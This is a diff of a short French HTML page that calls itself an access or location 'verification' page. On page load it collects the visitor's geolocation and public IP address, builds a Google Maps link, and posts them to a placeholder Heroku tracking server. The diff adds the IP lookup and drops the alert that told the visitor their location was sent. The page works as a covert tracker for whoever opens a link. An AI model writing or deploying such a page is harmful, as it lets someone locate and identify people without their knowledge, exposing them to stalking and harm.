@@ -3,34 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification</title>
+    <title>Localisation & Envoi Email</title>
     <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-            } else {
-                alert("La géolocalisation n'est pas supportée par ce navigateur.");
+        async function getIP() {
+            try {
+                let response = await fetch('https://api64.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("Erreur de récupération de l'IP :", error);
+                return "IP inconnue";
             }
         }
 
-        function sendLocation(position) {
-            const data = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy
-            };
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const ip = await getIP();
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
 
-            fetch('https://ton-app.herokuapp.com/track', {  // Remplace avec ton URL Heroku
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Données envoyées", data);
-                alert("Localisation envoyée !");
-            })
-            .catch(error => console.error("Erreur", error));
+                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    const data = { ip, latitude, longitude, accuracy, googleMapsLink };
+
+                    fetch('https://ton-serveur-heroku.herokuapp.com/track', { // 🔴 MODIFIE L'URL ICI !
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log("Données envoyées :", data))
+                    .catch(error => console.error("Erreur :", error));
+                }, handleError);
+            } else {
+                alert("La géolocalisation n'est pas supportée par ce navigateur.");
+            }
         }
 
         function handleError(error) {
@@ -39,6 +47,6 @@
     </script>
 </head>
 <body onload="getLocation()">
-    <h1>Vérification de l'accès...</h1>
+    <h1>Vérification de la localisation...</h1>
 </body>
 </html>
